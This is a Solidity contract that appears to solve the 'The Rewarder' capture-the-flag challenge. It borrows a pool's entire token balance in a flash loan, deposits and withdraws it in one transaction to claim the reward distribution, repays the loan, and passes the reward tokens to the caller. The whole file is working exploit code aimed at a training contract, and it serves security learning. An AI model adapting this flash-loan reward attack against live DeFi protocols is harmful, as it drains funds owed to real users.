// SPDX-License-Identifier: MIT

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

pragma solidity ^0.8.0;

contract AttackRewarder {
    address loanerPool;
    address rewarderPool;
    address liquidityToken;
    address rewardToken;

    constructor(
        address _loanerPool,
        address _rewarderPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        loanerPool = _loanerPool;
        rewarderPool = _rewarderPool;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint amount) external {
        DamnValuableToken(liquidityToken).approve(rewarderPool, amount);
        TheRewarderPool(rewarderPool).deposit(amount);
        TheRewarderPool(rewarderPool).withdraw(amount);
        DamnValuableToken(liquidityToken).transfer(loanerPool, amount);
    }

    function attack() external {
        FlashLoanerPool(loanerPool).flashLoan(
            DamnValuableToken(liquidityToken).balanceOf(loanerPool)
        );
        RewardToken(rewardToken).transfer(
            msg.sender,
            RewardToken(rewardToken).balanceOf(address(this))
        );
    }
}
